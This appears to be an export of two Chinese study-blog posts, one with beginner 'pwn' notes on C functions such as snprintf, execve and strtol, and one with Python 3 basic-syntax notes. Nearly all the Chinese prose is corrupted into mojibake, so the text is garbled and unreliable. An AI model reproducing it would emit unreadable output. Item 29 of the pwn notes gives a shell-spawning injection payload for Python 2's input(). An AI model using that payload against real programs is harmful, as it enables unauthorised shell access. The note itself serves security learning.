<p>æˆåŠŸæ‰§è¡Œè¿”å›0,å¦åˆ™è¿”å›éé›¶å€¼</p>
<p>16ã€**/dev/random<strong>å’Œ</strong>/dev/urandomLinux**æ˜¯ç³»ç»Ÿä¸­æä¾›çš„éšæœºä¼ªè®¾å¤‡ã€‚è¿™ä¸¤ä¸ªè®¾å¤‡çš„ä»»åŠ¡ï¼Œæ˜¯æä¾›æ°¸ä¸ä¸ºç©ºçš„éšæœºå­—èŠ‚æ•°æ®æµ </p>
<p>ç”¨æ³•ï¼šç”¨openå‡½æ•°æ‰“å¼€ï¼Œç„¶åä»æ–‡ä»¶æè¿°ç¬¦ä¸­è·å–æ•°æ®å³å¯ã€‚</p>
<p>17ã€strcspnå‡½æ•°åŸå‹ï¼š**size_t strcspn(const char *s, const char * reject) **</p>
<p>åŠŸèƒ½ï¼šstrcspn()ä»å‚æ•°s å­—ç¬¦ä¸²çš„å¼€å¤´è®¡ç®—è¿ç»­çš„å­—ç¬¦ï¼Œè€Œè¿™äº›å­—ç¬¦éƒ½å®Œå…¨ä¸åœ¨å‚æ•°reject æ‰€æŒ‡çš„å­—ç¬¦ä¸²ä¸­ã€‚ç®€å•åœ°è¯´ï¼Œ è‹¥strcspn()è¿”å›çš„æ•°å€¼ä¸ºnï¼Œåˆ™ä»£è¡¨å­—ç¬¦ä¸²s å¼€å¤´è¿ç»­æœ‰n ä¸ªå­—ç¬¦éƒ½ä¸å«å­—ç¬¦ä¸²reject å†…çš„å­—ç¬¦ã€‚</p>
<p>è¿”å›å€¼ä¸ºè¿”å›å­—ç¬¦ä¸²s å¼€å¤´è¿ç»­ä¸å«å­—ç¬¦ä¸²reject å†…çš„å­—ç¬¦æ•°ç›®ã€‚</p>
<p>18ã€å›è½¦ ä»£ç ï¼šCR ASCIIç ï¼š/ r ï¼Œåå…­è¿›åˆ¶ï¼Œ0x0dï¼Œå›è½¦çš„ä½œç”¨åªæ˜¯ç§»åŠ¨å…‰æ ‡è‡³è¯¥è¡Œçš„èµ·å§‹ä½ç½®ï¼›</p>
<p>æ¢è¡Œ ä»£ç ï¼šLF ASCIIç ï¼š/ n ï¼Œåå…­è¿›åˆ¶ï¼Œ0x0aï¼Œæ¢è¡Œè‡³ä¸‹ä¸€è¡Œè¡Œé¦–èµ·å§‹ä½ç½®ï¼›</p>
<p>19ã€snprintf å‡½æ•°åŸå‹**int snprintf(char <em>str, size_t size, const char <em>format, â€¦)</em></em></p>
<p>åŠŸèƒ½ï¼šå°†å¯å˜ä¸ªå‚æ•°(â€¦)æŒ‰ç…§formatæ ¼å¼åŒ–æˆå­—ç¬¦ä¸²ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ°strä¸­ã€‚</p>
<p>(1) å¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦ &lt; sizeï¼Œåˆ™å°†æ­¤å­—ç¬¦ä¸²å…¨éƒ¨å¤åˆ¶åˆ°strä¸­ï¼Œå¹¶ç»™å…¶åæ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸç¬¦(â€˜\0â€™)ï¼›</p>
<p>(2) å¦‚æœæ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦ &gt;= sizeï¼Œåˆ™åªå°†å…¶ä¸­çš„(size-1)ä¸ªå­—ç¬¦å¤åˆ¶åˆ°strä¸­ï¼Œå¹¶ç»™å…¶åæ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æŸç¬¦(â€˜\0â€™)ï¼Œè¿”å›å€¼ä¸ºæ¬²å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> a[<span class="hljs-number">16</span>];<br>  <span class="hljs-keyword">size_t</span> i;<br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">13</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);  <span class="hljs-comment">// ç¬¬ 1 ç§æƒ…å†µ</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// è¾“å‡ºï¼ši = 12, a = 000000012345</span><br> <br>  i = <span class="hljs-built_in">snprintf</span>(a, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;%012d&quot;</span>, <span class="hljs-number">12345</span>);   <span class="hljs-comment">// ç¬¬ 2 ç§æƒ…å†µ</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i = %lu, a = %s\n&quot;</span>, i, a);    <span class="hljs-comment">// è¾“å‡ºï¼ši = 12, a = 00000001</span><br> <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>20ã€<strong>int execve(const char * filename,char * const argv[ ],char * const envp[ ])</strong></p>
<p>execve()ç”¨æ¥æ‰§è¡Œå‚æ•°filenameå­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯åˆ©ç”¨æŒ‡é’ˆæ•°ç»„æ¥ä¼ é€’ç»™æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”éœ€è¦ä»¥ç©ºæŒ‡é’ˆ(NULL)ç»“æŸï¼Œæœ€åä¸€ä¸ªå‚æ•°åˆ™ä¸ºä¼ é€’ç»™æ‰§è¡Œæ–‡ä»¶çš„æ–°ç¯å¢ƒå˜é‡æ•°ç»„ã€‚</p>
<p>21ã€**getchar()**çš„è¿”å›å€¼ä¸ºè¾“å…¥å­—ç¬¦çš„ASCIIç å€¼ã€‚åˆå› ä¸ºåœ¨å­—ç¬¦ä¸²åœ¨å†…å­˜é‡Œé¢éƒ½æ˜¯ä»¥ASCIIç å€¼å­˜å‚¨çš„ï¼Œæˆ‘ä»¬è¾“å…¥çš„payloadéƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ¢è¨€ä¹‹ï¼Œè¿›è¡Œå¾ªç¯çš„getcharå°±æ˜¯å¦ç±»çš„read</p>
<p>22ã€**extern char <em>strdup(char <em>s)</em></em></p>
<p>strdup()å¯ä»¥å°†å­—ç¬¦ä¸²æ‹·è´åˆ°æ–°å»ºçš„ä½ç½®å¤„ï¼Œstrdup()åœ¨å†…éƒ¨è°ƒç”¨äº†malloc()ä¸ºå˜é‡åˆ†é…å†…å­˜ï¼Œä¸éœ€è¦ä½¿ç”¨è¿”å›çš„å­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦ç”¨free()é‡Šæ”¾ç›¸åº”çš„å†…å­˜ç©ºé—´ï¼Œå¦åˆ™ä¼šé€ æˆå†…å­˜æ³„æ¼ã€‚è¿”å›ä¸€ä¸ªæŒ‡é’ˆ,æŒ‡å‘ä¸ºå¤åˆ¶å­—ç¬¦ä¸²åˆ†é…çš„ç©ºé—´ï¼Œå¦‚æœåˆ†é…ç©ºé—´å¤±è´¥,åˆ™è¿”å›NULLå€¼</p>
<p>23ã€<strong>size_t getpagesize(void)</strong></p>
<p>å‡½æ•°åŠŸèƒ½ä¸ºï¼šè¿”å›ä¸€åˆ†é¡µçš„å¤§å°ï¼Œå•ä½ä¸ºå­—èŠ‚(byte)ã€‚æ­¤ä¸ºç³»ç»Ÿçš„åˆ†é¡µå¤§å°ï¼Œä¸ä¸€å®šä¼šå’Œç¡¬ä»¶åˆ†é¡µå¤§å°ç›¸åŒã€‚</p>
<p>è¿”å›å€¼ï¼šå†…å­˜åˆ†é¡µå¤§å°ã€‚</p>
<p>24ã€**extern void <em>memchr(const void <em>buf, int ch, size_t count)</em></em></p>
<p>åŠŸèƒ½ï¼šä»bufæ‰€æŒ‡å†…å­˜åŒºåŸŸçš„å‰countä¸ªå­—èŠ‚æŸ¥æ‰¾å­—ç¬¦chã€‚</p>
<p>è¯´æ˜ï¼šå½“ç¬¬ä¸€æ¬¡é‡åˆ°å­—ç¬¦chæ—¶åœæ­¢æŸ¥æ‰¾ã€‚å¦‚æœæˆåŠŸï¼Œè¿”å›æŒ‡å‘å­—ç¬¦chçš„æŒ‡é’ˆï¼›å¦åˆ™è¿”å›NULLã€‚</p>
<p>25ã€<strong>FILE *fopen(const char *filename, const char *mode)</strong></p>
<ul>
<li><strong>filename</strong>â€“ è¿™æ˜¯ C å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†è¦æ‰“å¼€çš„æ–‡ä»¶åç§°ã€‚</li>
<li><strong>mode</strong>â€“ è¿™æ˜¯ C å­—ç¬¦ä¸²ï¼ŒåŒ…å«äº†æ–‡ä»¶è®¿é—®æ¨¡å¼ã€‚</li>
</ul>
<p>åŠŸèƒ½ï¼šä½¿ç”¨ç»™å®šçš„æ¨¡å¼<strong>mode</strong>æ‰“å¼€<strong>filename</strong>æ‰€æŒ‡å‘çš„æ–‡ä»¶ï¼›æ–‡ä»¶é¡ºåˆ©æ‰“å¼€åï¼ŒæŒ‡å‘è¯¥æµçš„æ–‡ä»¶æŒ‡é’ˆå°±ä¼šè¢«è¿”å›ã€‚å¦‚æœæ–‡ä»¶æ‰“å¼€å¤±è´¥åˆ™è¿”å› NULLï¼Œå¹¶æŠŠé”™è¯¯ä»£ç å­˜åœ¨errorä¸­</p>
<p>26ã€<strong>size_t fread( void *buffer, size_t size, size_t count, FILE *stream )</strong></p>
<ul>
<li><strong>bufferâ€“æŒ‡å‘è¦è¾“å…¥çš„æ•°ç»„ä¸­é¦–ä¸ªå¯¹è±¡çš„æŒ‡é’ˆ</strong></li>
<li><strong>sizeâ€“ æ¯ä¸ªå¯¹è±¡çš„å¤§å°ï¼ˆå•ä½æ˜¯å­—èŠ‚ï¼‰</strong></li>
<li><strong>countâ€“ è¦è¯»å–çš„å¯¹è±¡ä¸ªæ•°</strong></li>
<li><strong>streamâ€“ è¾“å…¥æµ</strong></li>
</ul>
<p>åŠŸèƒ½ï¼šä»ç»™å®šè¾“å…¥æµstreamè¯»å–æœ€å¤šcountä¸ªå¯¹è±¡åˆ°æ•°ç»„bufferä¸­ï¼ˆç›¸å½“äºå¯¹æ¯ä¸ªå¯¹è±¡è°ƒç”¨sizeæ¬¡fgetc)ï¼ŒæŠŠbufferå½“ä½œunsigned charæ•°ç»„å¹¶é¡ºåºä¿å­˜ç»“æœã€‚æµçš„æ–‡ä»¶ä½ç½®æŒ‡ç¤ºå™¨å‰è¿›è¯»å–çš„å­—èŠ‚æ•°ã€‚</p>
<p>27ã€**char <em>strtok(char s[], const char <em>delim)</em></em></p>
<p>åŠŸèƒ½ï¼šåˆ†è§£å­—ç¬¦ä¸²ä¸ºä¸€ç»„å­—ç¬¦ä¸²ã€‚sä¸ºè¦åˆ†è§£çš„å­—ç¬¦ä¸²ï¼Œdelimä¸ºåˆ†éš”ç¬¦å­—ç¬¦ï¼ˆå¦‚æœä¼ å…¥å­—ç¬¦ä¸²ï¼Œåˆ™ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦å‡ä¸ºåˆ†å‰²ç¬¦ï¼‰ã€‚é¦–æ¬¡è°ƒç”¨æ—¶ï¼ŒsæŒ‡å‘è¦åˆ†è§£çš„å­—ç¬¦ä¸²ï¼Œä¹‹åå†æ¬¡è°ƒç”¨è¦æŠŠsè®¾æˆNULL</p>
<p>è¿”å›å€¼ï¼šä»så¼€å¤´å¼€å§‹çš„ä¸€ä¸ªä¸ªè¢«åˆ†å‰²çš„ä¸²ã€‚å½“sä¸­çš„å­—ç¬¦æŸ¥æ‰¾åˆ°æœ«å°¾æ—¶ï¼Œè¿”å›NULLï¼›å¦‚æœæŸ¥æ‰¾ä¸åˆ°delimä¸­çš„å­—ç¬¦æ—¶ï¼Œè¿”å›å½“å‰strtokçš„å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚</p>
<p>28ã€*<em>long int strtol(const char <em>nptr,char **endptr,int base)</em></em></p>
<p>åŠŸèƒ½ï¼šstrtolå‡½æ•°ä¼šå°†å‚æ•°nptrå­—ç¬¦ä¸²æ ¹æ®å‚æ•°baseæ¥è½¬æ¢æˆé•¿æ•´å‹æ•°ï¼Œå‚æ•°baseèŒƒå›´ä»2è‡³36</p>
<p>å‚æ•°baseä»£è¡¨é‡‡ç”¨çš„è¿›åˆ¶æ–¹å¼ï¼Œå¦‚baseå€¼ä¸º10åˆ™é‡‡ç”¨10è¿›åˆ¶ï¼Œè‹¥baseå€¼ä¸º16åˆ™é‡‡ç”¨16è¿›åˆ¶ç­‰ã€‚å½“baseå€¼ä¸º0æ—¶åˆ™æ˜¯é‡‡ç”¨10è¿›åˆ¶åšè½¬æ¢ï¼Œä½†é‡åˆ°å¦‚â€™0xâ€™å‰ç½®å­—ç¬¦åˆ™ä¼šä½¿ç”¨16è¿›åˆ¶åšè½¬æ¢ã€é‡åˆ°â€™0â€™å‰ç½®å­—ç¬¦è€Œä¸æ˜¯â€™0xâ€™çš„æ—¶å€™ä¼šä½¿ç”¨8è¿›åˆ¶åšè½¬æ¢ã€‚</p>
<p>29ã€python2ä¸­çš„input()å‡½æ•°å­˜åœ¨æ¼æ´ï¼Œä¼šæ‰§è¡Œè·å¾—çš„è¾“å…¥ï¼Œæ‰€ä»¥å¦‚æœè„šæœ¬å­˜åœ¨å¼•å…¥osåº“è¾“å…¥<code>os.system(&#39;/bin/sh&#39;)</code>å³å¯getshellï¼Œå¦‚æ²¡æœ‰å¼•å…¥osåº“ï¼Œè¾“å…¥è¯¥å†…å®¹<code>__import__(&#39;os&#39;).system(&#39;/bin/sh&#39;)s</code> ä¹Ÿå¯getshell</p>
<p>30ã€</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/image-20211007195137781.png" alt="image-20211007195137781"></p>
<p>å¯ç”¨è¯¥æ–¹æ³•å¾—åˆ°æ±‡ç¼–çš„æœºå™¨ç </p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonç¬”è®°</title>
    <url>/2020/11/09/2020-11-09-Python%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>æ³¨ï¼šç‰ˆæœ¬ä¸ºpython3ï¼ˆå­¦ä¹ æ¥è‡ªèœé¸Ÿæ•™ç¨‹ï¼‰</p>
<h3 id="ä¸€ã€åŸºç¡€è¯­æ³•"><a href="#ä¸€ã€åŸºç¡€è¯­æ³•" class="headerlink" title="ä¸€ã€åŸºç¡€è¯­æ³•"></a>ä¸€ã€åŸºç¡€è¯­æ³•</h3><p>1ã€æ ‡è¯†ç¬¦ï¼šç¬¬ä¸€ä¸ªå­—ç¬¦å¿…é¡»ä¸ºå­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ï¼Œå¯¹å¤§å°å†™æ•æ„Ÿï¼ˆåœ¨python3ä¸­<strong>å…è®¸ä¸­æ–‡</strong>ä½œä¸ºå˜é‡åï¼‰</p>
<p>**å…³é”®å­—ï¼šâ€™Falseâ€™, â€˜Noneâ€™, â€˜Trueâ€™, â€˜andâ€™, â€˜asâ€™, â€˜assertâ€™, â€˜breakâ€™, â€˜classâ€™, â€˜continueâ€™, â€˜defâ€™, â€˜delâ€™, â€˜elifâ€™, â€˜elseâ€™, â€˜exceptâ€™, â€˜finallyâ€™, â€˜forâ€™, â€˜fromâ€™, â€˜globalâ€™, â€˜ifâ€™, â€˜importâ€™, â€˜inâ€™, â€˜isâ€™, â€˜lambdaâ€™, â€˜nonlocalâ€™, â€˜notâ€™, â€˜orâ€™, â€˜passâ€™, â€˜raiseâ€™, â€˜returnâ€™, â€˜tryâ€™, â€˜whileâ€™, â€˜withâ€™, â€˜yieldâ€™ **</p>
<p>2ã€å•è¡Œæ³¨é‡Šä»¥#å¼€å¤´ï¼Œå¤šè¡Œæ³¨é‡Šå¯ä»¥å˜æˆæ¯è¡Œç”¨ä¸€ä¸ª#</p>
<p>åœ¨â€™â€™â€™     â€˜â€™â€™ ï¼ˆæˆ–æ˜¯â€â€â€   â€œâ€â€ï¼‰ä¹‹é—´è¿›è¡Œå¤šè¡Œæ³¨é‡Š</p>
<p>3ã€pythonä¸­ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºä»£ç å—ï¼Œä¸å†ä½¿ç”¨ï½›ï½ï¼ˆç¼©è¿›çš„ç©ºæ ¼æ•°ä¸é™åˆ¶ï¼Œä½†æ˜¯åŒä¸€ä¸ªä»£ç å—çš„ç¼©è¿›ç©ºæ ¼æ•°å¿…é¡»ä¿æŒä¸€è‡´ï¼‰</p>
<p>4ã€å½“è¯­å¥è¿‡é•¿æƒ³è¦åˆ†è¡Œå†™æ—¶ï¼Œå¯ä»¥åœ¨æœ«å°¾åŠ ä¸Šä¸€ä¸ª \ è¡¨ç¤ºä¸‹ä¸€è¡Œæ˜¯ä¸Šä¸€è¡Œçš„è¿ç»­ï¼ˆä¸å»ºè®®ä½¿ç”¨ï¼‰ï¼›æˆ–æ˜¯åŒ…åœ¨( )  ï¼Œ{ } ï¼Œ [ ] é‡Œé¢è¿›è¡Œåˆ†è¡Œå†™ä¹Ÿå¯ä»¥ï¼Œæ­¤æ—¶å°±ä¸è¦  \ äº†</p>
<p>5ã€â€˜ \ â€™è¡¨ç¤ºè½¬ä¹‰ç¬¦å·ï¼Œè€ŒæŠŠrå†™åœ¨å‰é¢å¯ä»¥è®© \ ä¸å‘ç”Ÿè½¬ä¹‰ï¼Œè€Œå½“åšä¸€ä¸ªå­—ç¬¦</p>
<p>6ã€å­—ç¬¦ä¸²ä¸­ï¼špythonä¸­å•å¼•å·ä¸åŒå¼•å·ç”¨æ³•ç›¸åŒï¼ˆè™½ç„¶å¦‚æ­¤ï¼Œå½“ä½œä¸ºå…ˆå­¦cçš„è¯ï¼Œè¿˜æ˜¯æŒ‰ç€cçš„æ¥æ¯”è¾ƒå¥½ï¼‰ï¼Œè€Œä½¿ç”¨â€™â€™â€™ æˆ–è€…â€â€â€å¯ä»¥æŒ‡å®šä¸€ä¸ªå¤šè¡Œå­—ç¬¦ä¸²</p>
<p>ä¼šæŒ‰å­—é¢æ„æ€è¿›è¡Œè¿æ¥å­—ç¬¦ä¸²å¦‚ï¼šâ€œthisâ€ â€œisâ€ â€œstringâ€ä¼šè‡ªåŠ¨æ¢ä¸ºthis is string</p>
<p>å­—ç¬¦ä¸²å¯ä»¥ç”¨+è¡¨ç¤ºè¿å­—ç¬¦è¿æ¥åœ¨ä¸€èµ·ï¼Œç”¨*aå¤åˆ¶å½“å‰å­—ç¬¦ï¼Œaè¡¨ç¤ºå¤åˆ¶æ¬¡æ•°</p>
<p>pythonä¸­çš„å­—ç¬¦ä¸²ä»<strong>å·¦å¾€å³ä»¥0ä½œä¸ºå¼€å§‹ï¼Œä»å³å¾€å·¦æ˜¯-1å¼€å§‹</strong>ã€‚å¹¶ä¸”å­—ç¬¦ä¸²ä¸èƒ½è¢«æ”¹å˜</p>
<p>pythonä¸­æ²¡æœ‰å­—ç¬¦ç±»å‹ï¼Œä¸€ä¸ªå­—ç¬¦å°±æ˜¯å¦ç±»çš„é•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²</p>
<p>å­—ç¬¦ä¸²çš„æˆªå–æ ¼å¼ä¸ºï¼š<strong>å˜é‡[å¤´ä¸‹æ ‡:å°¾ä¸‹æ ‡]</strong>   å½“æŠŠå°¾ä¸‹æ ‡ä¸ºç©ºæ—¶ï¼Œè¡¨ç¤ºä»å¤´ä¸‹æ ‡çš„ä½ç½®è¾“å‡ºä¹‹åçš„å­—ç¬¦</p>
<p>7ã€ç©ºè¡Œï¼šå‡½æ•°ä¹‹é—´æˆ–ç±»ä¹‹é—´ç”¨ç©ºè¡Œåˆ†éš”ï¼Œè¡¨ç¤ºæ–°ä¸€æ®µä»£ç çš„å¼€å§‹ã€‚æœ‰æ²¡æœ‰ä¸ä¼šå¯¹ç¨‹åºé€ æˆå½±å“ï¼Œå…¶ä½œç”¨åœ¨äºç¾è§‚ä»¥åŠä¾¿äºå¤æŸ¥</p>
<p>8ã€input(  )ç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œè¿”å›å€¼æ˜¯å­—ç¬¦ä¸²ç±»å‹</p>
<p>9ã€pythonåœ¨åŒä¸€è¡Œä¸­ä½¿ç”¨å¤šæ¡è¯­å¥ï¼Œè¯­å¥ä¹‹é—´ä½¿ç”¨   <strong>;</strong>   åˆ†éš” è€Œè‹¥æ˜¯æ¯è¡Œåªå†™ä¸€ä¸ªè¯­å¥ï¼Œåˆ™æ— éœ€åˆ†å·</p>
<p>10ã€åƒifã€whileã€defå’Œclassçš„å¤åˆè¯­å¥ï¼Œé¦–è¡Œ<strong>ä»¥å…³é”®å­—å¼€å§‹ï¼Œä»¥å†’å·(:) ç»“æŸ</strong>ï¼Œè·Ÿåœ¨è¿™åé¢çš„è¯­å¥æ„æˆä¸€ä¸ªä»£ç ç»„</p>
<p>11ã€è¾“å‡ºï¼šprintï¼ˆ<strong>æ²¡æœ‰fï¼</strong>ï¼‰</p>
<p>ï¼ˆ1ï¼‰pythonä¸­çš„printé»˜è®¤è¾“å‡ºæ˜¯æ¢è¡Œçš„ï¼Œè‹¥è¦ä¸æ¢è¡Œï¼Œéœ€è¦åœ¨å˜é‡æœ«å°¾åŠ ä¸Šend=â€â€ï¼ˆåŒå¼•å·ä¸­æœ‰ä»€ä¹ˆç¬¦å·ï¼Œä»£è¡¨ç€ä¸ä¸‹è¡Œçš„è¾“å‡ºä¹‹é—´æ˜¯å¦æœ‰ç¬¦å·å­˜åœ¨ï¼‰</p>
<p>ï¼ˆ2ï¼‰print() åœ†æ‹¬å·ä¸­ä¸å†åƒcè¯­è¨€ä¸­éœ€è¦åŒå¼•å·ï¼Œå¯ä»¥ç›´æ¥å¡«å…¥å˜é‡ï¼Œè‹¥æ˜¯åŠ ä¸ŠåŒå¼•å·åˆ™è¡¨ç¤ºå¼•å·å†…çš„æ˜¯å­—ç¬¦ä¸²ï¼Œä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºã€‚</p>
<p>ï¼ˆ3ï¼‰print( )ä¹Ÿå¯åƒcè¯­è¨€ä¸€æ ·ä½¿ç”¨ï¼Œä½¿ç”¨%d,%s,%cç­‰ä¸€ç³»åˆ—çš„ç¬¦å·ï¼Œåœ¨ä¸€æ®µè¾“å‡ºçš„è¯­å¥ä¸­æ’å…¥å€¼ï¼Œä½†æ˜¯æ³¨æ„è¦åœ¨åé¢çš„å˜é‡å€¼å‰ä¹ŸåŠ ä¸Š%ï¼Œå¦‚æœè¦æ’å…¥ä¸æ­¢ä¸€ä¸ªå˜é‡å€¼ï¼Œéœ€è¦ç”¨åœ†æ‹¬å·æ‹¬èµ·æ¥</p>
<p>ï¼ˆ4ï¼‰ï¼ˆ3ï¼‰ä¸­çš„ä½œç”¨å…¶å®ä¹Ÿå¯ç›´æ¥æŠŠå˜é‡æ”¾å…¥åˆ°åº”æ”¾åˆ°çš„ä½ç½®ï¼Œå°±æ˜¯æœ¬æ¥å¯èƒ½å®Œæ•´çš„å­—ç¬¦ä¸²ä¼šå˜æˆé›¶ç¢</p>
<p>12ã€å¯¼å…¥æ¨¡å—ï¼šä½¿ç”¨importæˆ–è€…from  Â·Â·Â·Â·Â·Â·  import        æ¨¡å—ï¼šsomemoduleï¼ˆä»£è¡¨æŸä¸ªæ¨¡å—ï¼‰</p>
<p>(1)<strong>import somemodule</strong> ï¼šå°†æ•´ä¸ªæ¨¡å—å¯¼å…¥</p>
<p>(2)<strong>from somemodule import somefunction</strong> ï¼šä»æŸä¸ªæ¨¡å—ä¸­å¯¼å…¥æŸä¸ªå‡½æ•°</p>
<p>(3)<strong>from somemodule import firstfunc,secondfunc,thirdfunc</strong> ï¼šä»æŸä¸ªæ¨¡å—å¯¼å…¥å¤šä¸ªå‡½æ•°</p>
<p>(4)**from somemodule import ***ï¼šå°†æ•´ä¸ªæ¨¡å—çš„å…¨éƒ¨å‡½æ•°å¯¼å…¥</p>
<p> ï¼ˆç±»ä¼¼cè¯­è¨€ä¸­çš„é¢„å‘½ä»¤çš„å£°æ˜ï¼‰</p>
<p>13ã€help()ï¼šåœ†æ‹¬å·é‡Œé¢å¡«å†™å…¶ä»–å‡½æ•°åï¼Œå¯ä»¥æ˜¾ç¤ºä¸€ä¸ªå‡½æ•°çš„æ–‡æ¡£è¯´æ˜</p>
<p>14ã€å½“å­—ç¬¦ä¸²å†…å®¹ä¸ºæµ®ç‚¹å‹æ—¶è½¬æ¢ä¸ºæ•´å‹æ—¶ï¼Œä¸èƒ½ç›´æ¥ç”¨(int)() è½¬æ¢ï¼Œè¦å…ˆç”¨(float)()å†ç”¨(int)()</p>
<p>15ã€pythonä¸­å˜é‡ä¸éœ€è¦å®šä¹‰å£°æ˜ç±»å‹ï¼Œåªæœ‰åœ¨èµ‹å€¼ä»¥åå˜é‡æ‰ä¼šè¢«åˆ›å»ºï¼Œç”¨=è¿›è¡Œèµ‹å€¼ï¼Œä¸ºå˜é‡èµ‹ä¸Šä»€ä¹ˆç±»å‹çš„å€¼ï¼Œå˜é‡å°±æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œæ‰€ä»¥å˜é‡å¯ä»¥é€šè¿‡èµ‹å€¼æŒ‡å‘ä¸åŒç±»å‹çš„å¯¹è±¡</p>
<p>å¯ä»¥åŒæ—¶ä¸ºå¤šä¸ªå˜é‡èµ‹å€¼ï¼ša=b=c=1ï¼›</p>
<p>æŒ‰é¡ºåºç»™å¤šä¸ªå˜é‡è¿›è¡Œèµ‹å€¼ï¼šaï¼Œbï¼Œcï¼Œ=1ï¼Œ2ï¼Œâ€œrunoobâ€</p>
<p>16ã€**type()**å‡½æ•°ç”¨æ¥æŸ¥è¯¢å˜é‡æ‰€æŒ‡å‘çš„å¯¹è±¡ç±»å‹ï¼Œåœ†æ‹¬å·ç›´æ¥è¾“å…¥å˜é‡ï¼Œè¿è¡Œåå³å¯è¾“å‡ºæ‰€å¯¹åº”çš„å¯¹è±¡ç±»å‹</p>
<p><strong>isinstance(å˜é‡å,ç±»å‹å)</strong> åˆ¤æ–­å˜é‡åæ˜¯å¦å±äºè¯¥ç±»å‹åã€‚æ˜¯ï¼Œè¾“å‡ºTrueï¼›ä¸æ˜¯ï¼Œè¾“å‡ºFalse</p>
<p>åŒºåˆ«ï¼štype()ä¸ä¼šè®¤ä¸ºå­ç±»æ˜¯ä¸€ç§çˆ¶ç±»ç±»å‹ï¼›isinstance()ä¼šè®¤ä¸ºå­ç±»æ˜¯ä¸€ç§çˆ¶ç±»ç±»å‹</p>
<p>17ã€åˆ é™¤å¯¹è±¡å¼•ç”¨ï¼š<strong>del var1,var2,var3â€¦,varN</strong></p>
<p>åˆ é™¤å•ä¸ªæˆ–å¤šä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼š<strong>del varæˆ–è€… del var1,var2</strong></p>
<p>18ã€æ•°å€¼è¿ç®—ï¼š</p>
<p>ï¼ˆ1ï¼‰æ•°å€¼çš„é™¤æ³•æœ‰ä¸¤ä¸ªè¿ç®—ç¬¦ï¼š**/ä¸//**       **/**è¡¨ç¤ºè¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°     **//**è¡¨ç¤ºè¿”å›ä¸€ä¸ªæ•´æ•°</p>
<p>ï¼ˆ2ï¼‰ä¹˜æ–¹è¡¨ç¤ºä¸ºï¼ša**b ï¼ˆè¡¨ç¤ºä¸ºaçš„bæ¬¡æ–¹ï¼‰</p>
<p>ï¼ˆ3ï¼‰æ··åˆè¿ç®—æ—¶ï¼Œpythonä¼šæŠŠæ•´å‹æ•°è½¬æ¢æˆæµ®ç‚¹æ•°</p>
<p>ï¼ˆ4ï¼‰å…¶ä»–æ•°å€¼è¿ç®—ç¬¦å·ä¸cæ— å·®åˆ«</p>
<p>19ã€<strong>round(x,y)</strong> ï¼šå¯¹xè¿›è¡Œå››èˆå…­å…¥äº”çœ‹é½ï¼Œå¥‡è¿›å¶ä¸è¿›ï¼Œyè¡¨ç¤ºä¿ç•™å°æ•°ç‚¹åçš„ä½æ•°</p>
<p>20ã€<strong>range()</strong> ï¼šåˆ›é€ ä¸€ä¸ªæ•°åˆ—</p>
<p>ï¼ˆ1ï¼‰<strong>range(x)</strong> åˆ›é€ ä¸€ä¸ªåœ¨[0,x-1]ä¹‹é—´æ•´æ•°æ•°åˆ—ï¼Œxå¯ä¸ºè´Ÿæ•°</p>
<p>ï¼ˆ2ï¼‰<strong>range(x,y)</strong> åˆ›é€ ä¸€ä¸ªåœ¨[x,y-1]ä¹‹é—´çš„æ•´æ•°æ•°åˆ—ï¼Œxï¼Œyå‡å¯ä¸ºè´Ÿæ•°</p>
<p>ï¼ˆ3ï¼‰<strong>range(x,y,z)</strong> åˆ›é€ ä¸€ä¸ªåœ¨[x,y-1]ä¹‹é—´çš„æ•´æ•°æ•°åˆ—ï¼Œzä¸ºæ­¥é•¿ï¼Œä¸å†™æ—¶é»˜è®¤æ­¥é•¿ä¸º1</p>
